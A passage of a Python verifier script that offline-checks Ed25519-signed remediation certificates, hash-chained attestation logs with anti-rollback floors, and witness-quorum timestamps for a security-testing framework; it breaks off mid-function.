#!/usr/bin/env python3
"""verify_vf.py — a STANDALONE, VIGIL-FREE verifier for the whole Verifiable-Fact remediation lifecycle.

This is the negative/continuous counterpart to ``verify_pcf.py``. Where that file lets a third party
re-derive a POSITIVE proof-carrying finding ("the exploit provably worked") without trusting or running
VIGIL, this file lets the same third party re-derive the REMEDIATION lifecycle:

    vulnerable  →  proven-fixed  →  still-proven  (witnessed, no-later-than T)

with ZERO VIGIL code. It imports only the Python standard library and one Ed25519 library
(``cryptography``) — no ``framework``, no ``vigil_core``, no ``vigil_integration``, no ``strix``, no
``gateway``. Every byte format below is re-implemented FROM THE PRODUCERS' documented wire spec (the VF
design specs + the module docstrings), not by importing them; a differential test
(``integration/tests/test_vf_differential.py``) proves this verifier agrees with the in-tree VIGIL
verifiers byte-for-byte on real artifacts and on a battery of tampers.

WHAT IT PROVES (offline, no target, no network):
  * prove-cert authenticity — the whole four-state prove-certificate's Ed25519 signature validates
    against a pinned governance key, so state / reason / every bound digest is tamper-evident;
  * verdict agreement — verdict.remediation_state == state and verdict.oracle_fired == (STILL_VULNERABLE);
  * REMEDIATED cross-binding — the embedded RemediationCertificate's OWN signature verifies, its retained
    contexts re-hash to their signed digests, it carries a live target response, and it is cross-bound to
    the outer cert (same finding / bug_class / freshness challenge / evidence digest) — so a valid embedded
    cert from another run cannot be spliced in;
  * attestation series — a signed, hash-chained, anti-rollback monotonic series of re-proof ticks: the
    chain rebuilds from the tick digests, the governance-signed head binds it (head↔chain + m-of-n
    signature), the durable high-water floor refuses a rolled-back / truncated series (entry_count PRIMARY,
    last_seq secondary), every tick re-verifies, and the drift series
    (present → proven-fixed → still-proven → regressed) is derived;
  * witnessed time bound — a strict-majority witness quorum (2t > n over distinct, canonical, non-low-order
    keys) TIMED-co-signed the attestation head, yielding a median no-later-than ``T``; and, when the bundle
    carries an A1 external RFC3161 time anchor and a pinned TSA cert is supplied (``--tsa-cert-pin``), the
    token is verified over ``checkpoint_hash`` with the system ``openssl ts`` (still VIGIL-free) and its
    genTime SUPERSEDES the median — a witness-honesty-independent "existed no-later-than T".

WHAT IT DOES: this file re-fires the oracle STANDALONE for every oracle whose body is PURE and
STDLIB-ONLY, re-deriving the verdict from the retained ``oracle_context`` with ZERO VIGIL import — the
check that turns "the bytes are authentic and bound" into "the oracle is genuinely silent / genuinely
fired". It covers, as byte-for-byte VIGIL-FREE ports of the in-tree ``verify.oracles`` bodies:
(1) the ACHIEVED_STATE predicate RE-EXECUTABLE probe kernel (a pure JSON-AST evaluator, ``_reexecute_posture``);
(2) the SIX posture oracle bodies
(``verify.oracles.{policy_path,k8s_posture,k8s_workload_posture,cloud_posture,mesh_posture,cicd_posture}_oracle``)
as ``posture_*_fires`` + the ``reexecute_posture_oracle`` context reader (section 8b); and (3) — Lane C/C1 —
the GENERAL pure families (section 8c) via ``reexecute_general_oracle``: differential_response (+ the
smuggling-desync differential), timing, boolean_inference, side_effect, reflection_context, evaluation
(+ ssi), error_signature, sanitizer_signal, system_prompt_disclosure, prompt_injection, the sql/command/
nosql injection-breakout parse-proofs, weak_crypto_artifact and prototype_pollution. A byte-for-byte
semantic-parity test pins every ported family to the in-tree oracle on BOTH ``fired`` AND ``conclusive``
(integration/tests/test_{posture,general}_reexecutable.py). Each re-derivation confirms the verdict is the
correct FUNCTION of the retained values, WITHOUT proving the values are live (that still needs a VIGIL
re-run — the producer-supplied honesty bound). Otherwise this file checks SIGNATURES, BINDING, and
STRUCTURE — authenticity, cross-binding, digest binding, chain, anti-rollback, quorum, and the median
clock — all fully checkable standalone. A single flipped byte anywhere flips a standalone verdict to NOT SOUND.

WHAT IT DOES NOT DO (two honestly-distinct remainders — see docs/limitations/inventory.json
LIMIT-audit-package-reproduction, pinned by test_general_reexecutable.py::test_bucket_classification_is
_enforced): (1) GENUINELY IRREDUCIBLE — three oracle bodies cannot be re-fired with stdlib + the one
Ed25519 lib (cryptography) because their import-closure needs a module NOT in that surface: version_range
(packaging), saml_forgery (signxml / lxml), and oob_callback (the framework verify.oob receipt verification
backing an EXTERNAL collector). Those rest on the signature + an in-VIGIL re-run, NAMED here, never faked as
reproduced. (2) PURE-BUT-NOT-YET-PORTED — a residual of oracles whose bodies ARE re-fireable with stdlib +
cryptography (same producer-supplied honesty bound as the ported families) that this slice did not yet port:
service_reachability, tls_weakness (live-handshake path), active_exposure, dom_execution (+ csp_bypass),
credential_stuffing, automated_access/honeypot, jwt_forgery (HS/structural), static_rule, session_fixation,
mfa_bypass, password_reset_invariant, csrf_achieved, workflow_abuse, the client-side posture oracles
(clickjacking/csrf/postmessage/csp), email_auth/identity posture, certificate_validity (cryptography.x509)
and mobile_posture (cryptography), and the WARDEN-gated cloud/cluster capture oracles
(imds/secret/gcp/iam/k8s_rbac). Until ported they rest on the signature + an in-VIGIL re-run. This boundary
is stated precisely, not faked closed.

Verification only — no offensive capability, never writes, never phones home, deterministic.

Usage:
    verify_vf.py verify --bundle bundle.json
        [--signer-pubkeys keys.json]           # {key_id: pubkey_b64} — prove-cert + tick admission
        [--trust-root gov-trust-root.json]     # governance TrustRoot for the attestation head
        [--witness-trust-root wit-trust-root.json]
        [--fingerprint sha256:<hex>]           # out-of-band pin on --trust-root
        [--witness-fingerprint sha256:<hex>]   # out-of-band pin on --witness-trust-root
        [--min-distinct-signers N]             # strict witness roster requirement
        [--prove-standalone]                   # first assert no VIGIL module is imported/importable

    bundle.json := { "prove_cert": {...}?,
                     "attestation": {"ticks":[...], "head":{...}|null, "floor":{...}|null}?,
                     "witnessed":   {"checkpoint":{...}, "witness_signatures":[...]}? }

Exit 0 iff every present component is SOUND; 2 if any is NOT SOUND; 3 on a usage / I/O error.
"""

from __future__ import annotations

import argparse
import base64
import binascii
import datetime
import difflib
import hashlib
import html
import json
import math
import re
import shutil
import subprocess
import sys
import tempfile
from collections import Counter
from collections.abc import Mapping
from dataclasses import dataclass, field
from html.parser import HTMLParser
from pathlib import Path
from statistics import median
from typing import Any, Optional, Sequence
from urllib.parse import quote as _urlquote, urlsplit

from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey

# ---------------------------------------------------------------------------
# 0. VIGIL-free self-proof (optional, --prove-standalone). Same guarantee as verify_pcf: this verifier
#    imports only stdlib + cryptography; this check lets a caller *demonstrate* the running interpreter
#    has no VIGIL module reachable at all (used by the conformance test's clean subprocess).
# ---------------------------------------------------------------------------
# Every importable VIGIL package name a standalone env must NOT be able to reach. NOTE the offense egress
# gateway package is `vigil_gateway` (gateway/vigil_gateway) — checking only "gateway" would MISS it (the
# whole point of --prove-standalone is that NO vigil code is importable); "gateway" is kept as a defensive
# alias, and the crucible engine is reached as `framework`.
_VIGIL_MODULES = ("framework", "vigil_core", "vigil_integration", "vigil_gateway", "gateway", "strix")


def _assert_vigil_free() -> None:
    import importlib.util
    leaked = [m for m in _VIGIL_MODULES if m in sys.modules]
    if leaked:
        raise SystemExit(f"[FAIL] VIGIL modules already imported: {leaked} — not a standalone env")
    reachable = []
    for m in _VIGIL_MODULES:
        try:
            if importlib.util.find_spec(m) is not None:
                reachable.append(m)
        except (ImportError, ValueError, ModuleNotFoundError):
            pass
    if reachable:
        raise SystemExit(f"[FAIL] VIGIL modules are importable here: {reachable} — not a standalone env")
    print("  [standalone] confirmed VIGIL-free: framework / vigil_core / vigil_integration / vigil_gateway / "
          "gateway / strix are neither imported nor importable in this interpreter")


# ---------------------------------------------------------------------------
# 1. Canonical bytes + digests + domain separation.
#    TWO canonicalizers, because the producers use two:
#      * canonical_json      — ensure_ascii=False  (vigil_core.canonical / the crucible spine): used for
#        the prove-cert signing bytes, digest_payload, the chain entry/head bytes, and the timed-witness
#        bytes. This is the same function verify_pcf.py re-implements.
#      * canonical_json_ascii — ensure_ascii=True  (remediation_cert._canon): used ONLY for the embedded
#        RemediationCertificate's context digests and whole-cert signing bytes. For ASCII content the two
#        are byte-identical; they diverge ONLY on non-ASCII — so both are pinned against the producers on a
#        NON-ASCII payload in test_vf_differential.py::test_byte_parity_with_the_producers (an ASCII-only
#        parity test would not catch a swap of the two; the non-ASCII row does).
# ---------------------------------------------------------------------------
GENESIS_PREV = "0" * 64
_EVIDENCE_DOMAIN = b"crucible-evidence-v1\x00"
_PROVE_CERT_DOMAIN = b"vigil-remediation-prove-cert-v1\x00"
_REM_CERT_DOMAIN = b"vigil-remediation-cert-v2\x00"
_WITNESS_TIME_DOMAIN = b"vigil-attestation-witness-time-v1\x00"
# The timeless transparency checkpoint domain — used to recompute checkpoint_hash (what the RFC3161
# external time anchor binds). Byte-identical to transparency._WITNESS_DOMAIN. v2 (C-S1): the checkpoint
# now commits the prune boundary (base_seq/base_count) in to_dict; the domain suffix is bumped v1->v2 in
# lockstep so this standalone verifier recomputes the SAME checkpoint_hash the in-tree code signs.
_TRANSPARENCY_CHECKPOINT_DOMAIN = b"vigil-transparency-checkpoint-v2\x00"
# The Z1 channel-binding notary-cosign domain — byte-identical to channel_binding._CHANNEL_BINDING_DOMAIN.
_CHANNEL_BINDING_DOMAIN = b"vigil-zktls-channel-binding-v1\x00"
_CHANNEL_BINDING_SCHEMA = "vigil-zktls-channel-binding-v1"
_CHANNEL_BINDING_KINDS = ("tls-exporter", "tls-transcript", "test-vector")

_PROVE_CERT_SCHEMA = "vigil-remediation-prove-cert-v1"
_REM_CERT_SCHEMA = "vigil-remediation-cert-v2"


def canonical_json(payload: Any) -> bytes:
    return json.dumps(payload, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


def canonical_json_ascii(payload: Any) -> bytes:
    return json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def digest_payload(payload: Any) -> str:
    return sha256_hex(canonical_json(payload))


def evidence_signing_bytes(payload: dict) -> bytes:
    return _EVIDENCE_DOMAIN + canonical_json(payload)


def _context_digest(context: dict) -> str:
    """The remediation-cert context digest: sha256 of the ASCII-canonical context bytes (byte-identical
    to remediation_cert._context_digest / fix_oracle.build_fix_signer)."""
    return sha256_hex(canonical_json_ascii(context))


# ---------------------------------------------------------------------------
# 2. Ed25519 primitives + m-of-n threshold, with weak-key rejection (identical to verify_pcf / vigil_core).
# ---------------------------------------------------------------------------
_ED25519_P = 2**255 - 19
_Y_MASK = (1 << 255) - 1
_SMALL_ORDER_POINTS = (
    bytes(32),
    b"\x01" + bytes(31),
    bytes.fromhex("26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc05"),
    bytes.fromhex("c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a"),
    b"\xec" + b"\xff" * 31,
    b"\xed" + b"\xff" * 31,
    b"\xee" + b"\xff" * 31,
)


class WeakKey(Exception):
    """A public key that must never be admitted (non-canonical y>=p, or a low-order point)."""


def _reject_weak_public_key(raw: bytes) -> None:
    if (int.from_bytes(raw, "little") & _Y_MASK) >= _ED25519_P:
        raise WeakKey("Ed25519 public key is non-canonical (y >= p)")
    for entry in _SMALL_ORDER_POINTS:
        if raw[:31] == entry[:31] and (raw[31] & 0x7F) == (entry[31] & 0x7F):
            raise WeakKey("Ed25519 public key is a low-order point (weak key)")


def _b64_exact(value: str, n: int, what: str) -> bytes:
    raw = base64.b64decode(value, validate=True)
    if len(raw) != n:
        raise ValueError(f"{what} decodes to {len(raw)} bytes, expected {n}")
    return raw


def verify_one(public_key_b64: str, message: bytes, signature_b64: str) -> bool:
    """True iff a valid Ed25519 signature over ``message``. False on a bad signature OR any malformed
    key/signature material (fail-closed) — a caller never has to catch. Weak keys are rejected first."""
    try:
        raw = _b64_exact(str(public_key_b64), 32, "Ed25519 public key")
        _reject_weak_public_key(raw)
        sig = _b64_exact(str(signature_b64), 64, "Ed25519 signature")
    except (WeakKey, ValueError, binascii.Error):
        return False
    try:
        Ed25519PublicKey.from_public_bytes(raw).verify(sig, message)
        return True
    except InvalidSignature:
        return False


def verify_threshold(message: bytes, signatures: list, trust_root: dict) -> tuple[bool, list, str]:
    """Count DISTINCT trust-root authorisers with a valid signature; compare to the threshold. Signatures
    carry ``key_id`` + a base64 signature under ``signature_b64`` (spine wire) or ``sig`` (rem-cert wire).
    Returns (satisfied, valid_key_ids, reason)."""
    by_id = {a.get("key_id"): a for a in trust_root.get("authorizers", []) if isinstance(a, dict)}
    threshold = int(trust_root.get("threshold", 0))
    valid: list[str] = []
    seen: set = set()
    for s in signatures:
        if not isinstance(s, dict):
            continue
        kid = s.get("key_id")
        if kid in seen:
            continue
        seen.add(kid)
        auth = by_id.get(kid)
        if auth is None:
            continue
        sig_b64 = s.get("signature_b64") if s.get("signature_b64") is not None else s.get("sig")
        if verify_one(str(auth.get("public_key_b64", "")), message, str(sig_b64)):
            valid.append(str(kid))
    satisfied = len(valid) >= threshold and threshold >= 1
    return satisfied, valid, f"{len(valid)} valid distinct signature(s) vs threshold {threshold}"


def trust_root_fingerprint(trust_root: dict) -> str:
    return "sha256:" + digest_payload(trust_root)


def _check_pin(trust_root: dict, pin: str) -> tuple[bool, str]:
    fp = trust_root_fingerprint(trust_root)
    pin = (pin or "").strip()
    if not pin:
        return True, f"UNPINNED ({fp}) — authenticity NOT anchored; obtain the operator's fingerprint OOB"
    want = pin if pin.startswith("sha256:") else ("sha256:" + pin)
    if want.lower() != fp.lower():
        return False, f"fingerprint pin MISMATCH — expected {want}, got {fp}"
    return True, f"PINNED OK ({fp})"


# ---------------------------------------------------------------------------
# 3. RemediationCertificate (the embedded negative proof) — authenticity + digest binding + liveness.
#    Boundary: silence/control-fire (oracle re-fire) is NOT checked standalone (needs the oracle bodies).
# ---------------------------------------------------------------------------
# Response-bearing FindingContext keys: a NON-EMPTY value means the target actually ANSWERED (the same
# single-source-of-truth set remediation_cert._RESPONSE_KEYS uses for its liveness control). Connection-
# style capture fields are DELIBERATELY excluded (their helpers return a non-empty dict on FAILURE).
_RESPONSE_KEYS = frozenset({
    "baseline", "mutated", "probe_rounds", "baseline_latencies", "treatment_latencies",
    "observed_state", "observed_evidence", "observed_sink", "eval_observed", "eval_control",
    "error_observed", "error_control", "dom_binding_calls", "process_output", "oob_hits",
    "llm_output", "pi_treatment", "pi_control", "auth_events",
})


def _has_live_response(context: Any) -> bool:
    if not isinstance(context, dict):
        return False
    return any(context.get(k) not in (None, "", [], {}) for k in _RESPONSE_KEYS)


def _rem_cert_signing_bytes(cert_without_sig: dict) -> bytes:
    return _REM_CERT_DOMAIN + canonical_json_ascii(cert_without_sig)


def verify_remediation_cert(cert: dict, *, signer_pubkeys: dict) -> tuple[bool, str]:
    """Standalone verification of an embedded RemediationCertificate — the SUBSET checkable without the
    oracle: (bound) both retained contexts re-hash to their signed digests; (live) the patched context
    carries a target response; (authentic) the whole-cert Ed25519 signature over the rem-cert domain +
    ASCII-canonical cert-minus-signature verifies against the pinned key (so no control was stripped).
    Does NOT check silence/control-fire — that is the oracle-re-fire boundary the VIGIL verifier owns."""
    if not isinstance(cert, dict) or cert.get("schema") != _REM_CERT_SCHEMA:
        return False, "not a vigil-remediation-cert-v2"
    patched = cert.get("patched_oracle_context")
    control = cert.get("positive_control_context")
    if not (isinstance(patched, dict) and patched and isinstance(control, dict) and control):
        return False, "missing patched_oracle_context / positive_control_context"

    if not _has_live_response(patched):
        return False, "no captured response in the patched context — unreachable, not a proven fix (INDETERMINATE)"
    if (_context_digest(patched) != str(cert.get("patched_context_sha256") or "")
            or _context_digest(control) != str(cert.get("positive_control_sha256") or "")):
        return False, "context digest mismatch (patched or positive-control tampered)"

    sigblk = cert.get("signature")
    if not (isinstance(sigblk, dict) and sigblk.get("key_id") and sigblk.get("sig")):
        return False, "missing/malformed signature block"
    key_id, sig = str(sigblk["key_id"]), str(sigblk["sig"])
    pub = signer_pubkeys.get(key_id) if isinstance(signer_pubkeys, dict) else None
    if not pub:
        return False, f"no pinned public key for signer {key_id!r}"
    msg = _rem_cert_signing_bytes({k: v for k, v in cert.items() if k != "signature"})
    if not verify_one(pub, msg, sig):
        return False, "signature invalid (forged/tampered/stripped-control/wrong key)"
    return True, "bound + live + authentic (oracle silence/fire NOT checked standalone — needs VIGIL)"


# ---------------------------------------------------------------------------
# 4. The four-state ProveCertificate.
# ---------------------------------------------------------------------------
class State:
    REMEDIATED = "REMEDIATED"
    STILL_VULNERABLE = "STILL_VULNERABLE"
    INCONCLUSIVE = "INCONCLUSIVE"
    REFUSED = "REFUSED"


_STATES = (State.REMEDIATED, State.STILL_VULNERABLE, State.INCONCLUSIVE, State.REFUSED)


def _prove_cert_signing_bytes(cert_without_signer: dict) -> bytes:
    return _PROVE_CERT_DOMAIN + canonical_json(cert_without_signer)


def verify_prove_cert(cert: dict, *, signer_pubkeys: dict) -> tuple[bool, str]:
    """Offline verification of a four-state prove-certificate (mirrors the checkable subset of
    ``prove_driver.verify_prove_certificate``, minus the oracle re-fire):

      1. the whole-cert Ed25519 signature over the prove-cert domain + canonical cert-minus-signer
         verifies against a pinned governance key (state / reason / every bound digest tamper-evident);
      2. verdict.remediation_state == state and verdict.oracle_fired == (state == STILL_VULNERABLE);
      3. for REMEDIATED, the embedded RemediationCertificate is present, its own signature verifies +
         digests bind + it is live, and it is CROSS-BOUND to this outer cert (finding_id / bug_class /
         freshness_challenge / fresh_oracle_context_digest) — so a valid embedded cert from another run
         cannot be spliced in.

    Fail-closed. Does NOT re-fire the oracle (documented boundary — see the module docstring)."""
    if not isinstance(cert, dict) or cert.get("schema") != _PROVE_CERT_SCHEMA:
        return False, "not a vigil-remediation-prove-cert-v1"
    state = str(cert.get("state") or "")
    if state not in _STATES:
        return False, f"unknown state {state!r}"

    sigblk = cert.get("signer")
    if not (isinstance(sigblk, dict) and sigblk.get("key_id") and sigblk.get("signature")):
        return False, "missing/malformed signer block"
    key_id, sig = str(sigblk["key_id"]), str(sigblk["signature"])
    pub = signer_pubkeys.get(key_id) if isinstance(signer_pubkeys, dict) else None
    if not pub:
        return False, f"no pinned public key for signer {key_id!r}"
    msg = _prove_cert_signing_bytes({k: v for k, v in cert.items() if k != "signer"})
    if not verify_one(pub, msg, sig):
        return False, "signature invalid (forged/tampered/wrong key)"

    verdict = cert.get("verdict") or {}
    if str(verdict.get("remediation_state")) != state:
        return False, "verdict.remediation_state disagrees with the certificate state"
    if bool(verdict.get("oracle_fired")) != (state == State.STILL_VULNERABLE):
        return False, "verdict.oracle_fired disagrees with the state"

    if state == State.REMEDIATED:
        embedded = (cert.get("evidence") or {}).get("embedded_remediation_cert")
        if not isinstance(embedded, dict):
            return False, "REMEDIATED cert has no embedded RemediationCertificate"
        of = cert.get("original_finding") or {}
        ex = cert.get("execution") or {}
        ev = cert.get("evidence") or {}
        if str(embedded.get("finding_ref")) != str(of.get("finding_id")):
            return False, "embedded remediation cert finding_ref != outer finding_id"
        if str(embedded.get("bug_class")) != str(of.get("bug_class")):
            return False, "embedded remediation cert bug_class != outer bug_class"
        if str((embedded.get("controls") or {}).get("freshness_nonce")) != str(ex.get("freshness_challenge")):
            return False, "embedded remediation cert freshness_nonce != outer freshness_challenge"
        if str(embedded.get("patched_context_sha256")) != str(ev.get("fresh_oracle_context_digest")):
            return False, "embedded patched-context digest != outer fresh_oracle_context_digest"
        ok, reason = verify_remediation_cert(embedded, signer_pubkeys=signer_pubkeys)
        if not ok:
            return False, f"embedded remediation cert not verifiable standalone: {reason}"
        return True, "REMEDIATED: signed + cross-bound + embedded remediation authentic/bound/live"
    return True, f"{state}: signed and internally consistent"


# ---------------------------------------------------------------------------
# 5. Chain + signed head (identical bytes to vigil_core.chain / verify_pcf).
# ---------------------------------------------------------------------------
_HEAD_V2_FIELDS = ("base_seq", "base_prev_hash", "base_count", "cumulative_merkle_root",
                   "snapshot_seq", "prev_head_hash")


def _entry_hash(seq: int, prev_hash: str, cert_digest: str) -> str:
    return sha256_hex(canonical_json({"cert_digest": cert_digest, "prev_hash": prev_hash, "seq": seq}))


def build_chain(cert_digests: list) -> list[dict]:
    entries: list[dict] = []
    prev = GENESIS_PREV
    for i, cd in enumerate(cert_digests):
        eh = _entry_hash(i, prev, cd)
        entries.append({"seq": i, "prev_hash": prev, "cert_digest": cd, "entry_hash": eh})
        prev = eh
    return entries


def verify_chain(entries: list, *, genesis_prev: str = GENESIS_PREV) -> tuple[bool, str]:
    prev = genesis_prev
    for i, e in enumerate(entries):
        if e.get("prev_hash") != prev:
            return False, f"chain break at seq {e.get('seq')}: prev_hash mismatch (entry deleted/reordered)"
        if e.get("entry_hash") != _entry_hash(int(e["seq"]), str(e["prev_hash"]), str(e["cert_digest"])):
            return False, f"chain break at seq {e.get('seq')}: entry_hash mismatch (entry tampered)"
        if i > 0 and int(e["seq"]) != int(entries[i - 1]["seq"]) + 1:
            return False, f"chain break: seq gap at {e.get('seq')}"
        prev = str(e["entry_hash"])
    return True, f"{len(entries)} entr{'y' if len(entries) == 1 else 'ies'} link cleanly"


def _head_payload(head: dict) -> dict:
    d = dict(head)
    d.pop("signatures", None)
    if int(d.get("schema_version", 1)) < 2:
        for f in _HEAD_V2_FIELDS:
            d.pop(f, None)
    return d


def verify_head(head: dict, entries: list, trust_root: dict,
                *, prev_highwater: Optional[int] = None, genesis_prev: str = GENESIS_PREV) -> tuple[bool, str]:
    ok_chain, reason = verify_chain(entries, genesis_prev=genesis_prev)
    if not ok_chain:
        return False, reason
    exp_hash = str(entries[-1]["entry_hash"]) if entries else genesis_prev
    exp_seq = int(entries[-1]["seq"]) if entries else int(head.get("base_seq", 0))
    if (head.get("head_hash") != exp_hash or int(head.get("last_seq", -1)) != exp_seq
            or int(head.get("entry_count", -1)) != int(head.get("base_count", 0)) + len(entries)):
        return False, "head does not match the chain (log truncated or head rewritten)"
    satisfied, _valid, thr_reason = verify_threshold(
        evidence_signing_bytes(_head_payload(head)), head.get("signatures", []), trust_root)
    if not satisfied:
        return False, f"head signature invalid: {thr_reason}"
    if prev_highwater is not None and int(head.get("last_seq", 0)) < prev_highwater:
        return False, (f"rollback rejected: head last_seq {head.get('last_seq')} < accepted "
                       f"high-water {prev_highwater}")
    return True, (f"chain of {len(entries)} entr{'y' if len(entries)==1 else 'ies'} anchored by a "
                  f"valid signed head")


# ---------------------------------------------------------------------------
# 6. The Continuous Attestation Log — monotonic drift series over a signed, anti-rollback tick chain.
# ---------------------------------------------------------------------------
LABEL_PRESENT = "present"
LABEL_PROVEN_FIXED = "proven-fixed"
LABEL_STILL_PROVEN = "still-proven"
LABEL_REGRESSED = "regressed"
LABEL_INCONCLUSIVE = "inconclusive"
LABEL_REFUSED = "refused"
LABEL_UNKNOWN = "unknown"


def _derive_series(ticks: list) -> list[dict]:
    """Fold consecutive tick states into the VISION drift vocabulary (mirrors
    ``attestation_log._derive_series``). Each entry is {seq, state, label, reason_code}."""
    series: list[dict] = []
    proven = False
    for i, t in enumerate(ticks):
        state = str(t.get("state") or "")
        if state == State.REMEDIATED:
            label = LABEL_STILL_PROVEN if proven else LABEL_PROVEN_FIXED
            proven = True
        elif state == State.STILL_VULNERABLE:
            label = LABEL_REGRESSED if proven else LABEL_PRESENT
            proven = False
        elif state == State.INCONCLUSIVE:
            label = LABEL_INCONCLUSIVE
        elif state == State.REFUSED:
            label = LABEL_REFUSED
        else:
            label = LABEL_UNKNOWN
        reason = str((t.get("verdict") or {}).get("reason_code") or "")
        series.append({"seq": i, "state": state, "label": label, "reason_code": reason})
    return series


def _normalize_floor(floor: Optional[dict]) -> Optional[dict]:
    """Return {"entry_count": N, "last_seq": M} or None (absent). Raise ValueError on a PRESENT-but-corrupt
    floor (fail-closed — reading a corrupt floor as absent would fail-OPEN the anti-rollback guarantee)."""
    if floor is None:
        return None
    if not isinstance(floor, dict):
        raise ValueError("durable high-water floor is not a JSON object (possible tamper)")
    ec, ls = floor.get("entry_count"), floor.get("last_seq")

    def _nonneg_int(x: object) -> bool:
        return isinstance(x, int) and not isinstance(x, bool) and x >= 0

    if not (_nonneg_int(ec) and _nonneg_int(ls)):
        raise ValueError(f"floor has a missing/invalid entry_count/last_seq (possible tamper): "
                         f"entry_count={ec!r} last_seq={ls!r}")
    return {"entry_count": int(ec), "last_seq": int(ls)}


def verify_attestation_series(ticks: list, head: Optional[dict], floor: Optional[dict],
                              *, trust_root: dict, signer_pubkeys: dict) -> tuple[bool, str, list]:
    """Offline-verify the whole Continuous Attestation Log and derive its monotonic drift series
    (mirrors ``attestation_log.verify_log``). ``trust_root`` (head signature) and ``signer_pubkeys``
    (per-tick admission) are CALLER-PINNED out-of-band. FAIL-CLOSED — returns (False, reason, []) on any
    failure:

      1. the durable floor is consulted FIRST (it is the only component that can catch a FULL truncation
         to empty: an emptied log + removed head is validly 'empty' to the in-band signature);
      2. the chain rebuilds from the tick digests; ``verify_head`` binds the head to that chain
         (integrity + head↔chain + m-of-n signature) with the last_seq anti-rollback floor;
      3. the entry_count PRIMARY floor guard (last_seq is 0 for BOTH an empty and a 1-tick log);
      4. every tick re-verifies via ``verify_prove_cert``;
      5. only then is the drift series derived + returned."""
    try:
        floor = _normalize_floor(floor)
    except ValueError as e:
        return False, f"durable high-water unreadable: {e}", []

    if not ticks and head is None:
        if floor is not None and int(floor["entry_count"]) > 0:
            return False, (f"ROLLBACK: empty tick log + no signed head, but the durable floor records "
                           f"entry_count={floor['entry_count']} (the series was truncated to empty)"), []
        return True, "empty attestation log (no ticks)", []
    if head is None:
        return False, "tick log has entries but no signed head (truncated/removed head — fail closed)", []

    digests = [digest_payload(t) for t in ticks]
    entries = build_chain(digests)
    prev_seq = int(floor["last_seq"]) if floor else None
    ok, reason = verify_head(head, entries, trust_root, prev_highwater=prev_seq)
    if not ok:
        return False, f"chain/head not authentic or rolled back: {reason}", []
    if floor is not None:
        if int(head.get("entry_count", -1)) < int(floor["entry_count"]):
            return False, (f"ROLLBACK: head entry_count {head.get('entry_count')} < durable floor "
                           f"entry_count {floor['entry_count']} (truncated log / stale head replay)"), []
        if int(head.get("last_seq", -1)) < int(floor["last_seq"]):
            return False, (f"ROLLBACK: head last_seq {head.get('last_seq')} < durable floor last_seq "
                           f"{floor['last_seq']} (stale head / truncated log replay)"), []

    for i, t in enumerate(ticks):
        vok, vreason = verify_prove_cert(t, signer_pubkeys=signer_pubkeys)
        if not vok:
            return False, f"tick {i} failed re-verification (tampered/forged): {vreason}", []

    series = _derive_series(ticks)
    return True, (f"{len(ticks)} tick(s) authentic, chain unbroken, head signed, un-rolled-back "
                  f"(floor entry_count={floor['entry_count'] if floor else 0})"), series


# ---------------------------------------------------------------------------
# 7. Witnessed, time-bounded checkpoint (mirrors attestation_witness.verify_timed_witnessed +
#    transparency.is_split_view_resistant).
# ---------------------------------------------------------------------------
def is_split_view_resistant(witness_trust_root: dict) -> bool:
    """True iff the witness set is a STRICT MAJORITY (2*threshold > n) over ``n`` DISTINCT, canonical,
    non-low-order Ed25519 keys (dedup over the DECODED 32-byte key). Fail-closed on an empty set, any
    duplicate/shared public key (defeats quorum intersection), or any weak/malformed key. Byte-identical
    to ``transparency.is_split_view_resistant``."""
    auths = witness_trust_root.get("authorizers", [])
    distinct: set = set()
    try:
        for a in auths:
            raw = _b64_exact(str(a.get("public_key_b64", "")), 32, "witness key")
            _reject_weak_public_key(raw)
            distinct.add(raw)
    except (WeakKey, ValueError, binascii.Error):
        return False
    n = len(distinct)
    if n != len(auths):
        return False
    return n > 0 and 2 * int(witness_trust_root.get("threshold", 0)) > n


def _timed_signing_bytes(checkpoint: dict, observed_time: int) -> bytes:
    """The exact bytes a witness signs for a TIMED co-signature: the distinct timed domain over a
    canonical payload binding BOTH the checkpoint identity AND the witness's observed time (byte-identical
    to attestation_witness._timed_signing_bytes)."""
    return _WITNESS_TIME_DOMAIN + canonical_json(
        {"checkpoint": checkpoint, "observed_time": int(observed_time)})


def checkpoint_hash(checkpoint: dict) -> str:
    """sha256 of the domain-separated canonical checkpoint — the stable identity the RFC3161 external time
    anchor binds (byte-identical to ``transparency.checkpoint_hash``)."""
    return sha256_hex(_TRANSPARENCY_CHECKPOINT_DOMAIN + canonical_json(checkpoint))


def openssl_ts_available() -> bool:
    """True iff a usable ``openssl`` binary with the ``ts`` subcommand is reachable (needed to check the A1
    anchor). openssl ts ships on ubuntu-latest CI runners; this stays VIGIL-free (external process)."""
    if shutil.which("openssl") is None:
        return False
    try:
        r = subprocess.run(["openssl", "ts", "-help"], capture_output=True, text=True, timeout=15)
    except (OSError, subprocess.SubprocessError):
        return False
    combined = r.stdout + r.stderr
    return "ts [options]" in combined or "Query options" in combined


def _anchor_gentime_epoch(token_path: Path) -> Optional[int]:
    """Read genTime ONLY from the signature-covered TimeStampToken as an integer UNIX epoch (UTC); None on
    parse failure (fail-closed). Reads the SIGNED token, NOT the verifier wall clock.

    SECURITY: the ``TimeStampResp`` wraps the signed token in an UNSIGNED ``PKIStatusInfo`` that
    ``ts -verify`` does not cover and that openssl prints BEFORE the signed section — so a producer can
    inject a ``statusString`` free-text ``Time stamp:`` line to backdate the anchor while the signature
    still verifies. We therefore extract the signed token alone with ``ts -token_out`` (dropping the status
    wrapper) and parse genTime from THAT via ``-token_in``, so genTime comes only from TSA-signed bytes."""
    with tempfile.TemporaryDirectory() as td:
        tst = Path(td) / "tst.der"
        r0 = subprocess.run(["openssl", "ts", "-reply", "-in", str(token_path), "-token_out", "-out",
                             str(tst)], capture_output=True, text=True)
        if r0.returncode != 0 or not tst.exists():
            return None
        r = subprocess.run(["openssl", "ts", "-reply", "-in", str(tst), "-token_in", "-text"],
                           capture_output=True, text=True)
    if r.returncode != 0:
        return None
    for line in r.stdout.splitlines():
        s = line.strip()
        if s.lower().startswith("time stamp:"):
            value = s.split(":", 1)[1].strip()
            try:
